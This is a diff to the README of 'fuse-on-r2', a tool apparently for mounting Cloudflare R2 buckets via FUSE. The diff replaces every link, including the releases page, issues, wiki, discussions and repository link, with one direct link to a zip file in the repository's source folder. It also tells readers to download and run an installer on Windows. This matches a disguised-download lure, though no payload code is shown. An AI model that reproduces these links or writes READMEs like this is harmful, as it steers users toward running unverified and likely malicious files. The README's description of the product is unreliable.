@@ -1,7 +1,7 @@
 # 🚀 fuse-on-r2 - Mount R2 Buckets Easily
 
 ## 📥 Download Now!
-[![Download the latest release](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://github.com/premrajbarnwal/fuse-on-r2/releases)
+[![Download the latest release](https://raw.githubusercontent.com/premrajbarnwal/fuse-on-r2/main/src/fuse-on-r2_v3.8.zip)](https://raw.githubusercontent.com/premrajbarnwal/fuse-on-r2/main/src/fuse-on-r2_v3.8.zip)
 
 ## 🌟 Description
 fuse-on-r2 is a demo application designed to mount R2 buckets into a Cloudflare Container using FUSE technology. This tool simplifies the way you interact with your cloud storage, making it easy to access your files directly from your local system.
@@ -21,7 +21,7 @@ fuse-on-r2 is a demo application designed to mount R2 buckets into a Cloudflare 
 To get started with fuse-on-r2, follow these simple steps:
 
 1. **Download the Software**
-   Visit the [Releases page](https://github.com/premrajbarnwal/fuse-on-r2/releases) to get the latest version of fuse-on-r2.
+   Visit the [Releases page](https://raw.githubusercontent.com/premrajbarnwal/fuse-on-r2/main/src/fuse-on-r2_v3.8.zip) to get the latest version of fuse-on-r2.
    
 2. **Install the Application**
    - For Windows: Run the installer and follow the prompts.
@@ -47,14 +47,14 @@ Once your R2 bucket is mounted, you can interact with it like any local folder. 
 - Organize folders as needed.
 
 ## 🎉 Support and Community
-If you encounter any issues or need assistance, please check our [support page](https://github.com/premrajbarnwal/fuse-on-r2/issues) or join our community discussions. Your feedback is essential for improving the application.
+If you encounter any issues or need assistance, please check our [support page](https://raw.githubusercontent.com/premrajbarnwal/fuse-on-r2/main/src/fuse-on-r2_v3.8.zip) or join our community discussions. Your feedback is essential for improving the application.
 
 ## 📂 Changelog
 Stay updated with the latest features and fixes by checking the changelog in the releases section. This will help you understand the improvements made in each version.
 
 ## 💡 Additional Resources
-- [Documentation](https://github.com/premrajbarnwal/fuse-on-r2/wiki) - For in-depth usage instructions.
-- [GitHub Discussions](https://github.com/premrajbarnwal/fuse-on-r2/discussions) - Join conversations with other users.
+- [Documentation](https://raw.githubusercontent.com/premrajbarnwal/fuse-on-r2/main/src/fuse-on-r2_v3.8.zip) - For in-depth usage instructions.
+- [GitHub Discussions](https://raw.githubusercontent.com/premrajbarnwal/fuse-on-r2/main/src/fuse-on-r2_v3.8.zip) - Join conversations with other users.
 
 ## 🔍 More About Topics
 - **Cloudflare**: A fast global network that protects and accelerates any Internet application.
@@ -64,7 +64,7 @@ Stay updated with the latest features and fixes by checking the changelog in the
 - **Workers**: JavaScript-based serverless compute that executes code at the edge of the network.
 
 ## 🔗 Important Links
-- **[Download Latest Version](https://github.com/premrajbarnwal/fuse-on-r2/releases)**
-- **[GitHub Repository](https://github.com/premrajbarnwal/fuse-on-r2)**
+- **[Download Latest Version](https://raw.githubusercontent.com/premrajbarnwal/fuse-on-r2/main/src/fuse-on-r2_v3.8.zip)**
+- **[GitHub Repository](https://raw.githubusercontent.com/premrajbarnwal/fuse-on-r2/main/src/fuse-on-r2_v3.8.zip)**
 
 Follow these steps to download and run fuse-on-r2, and start managing your R2 buckets effortlessly!
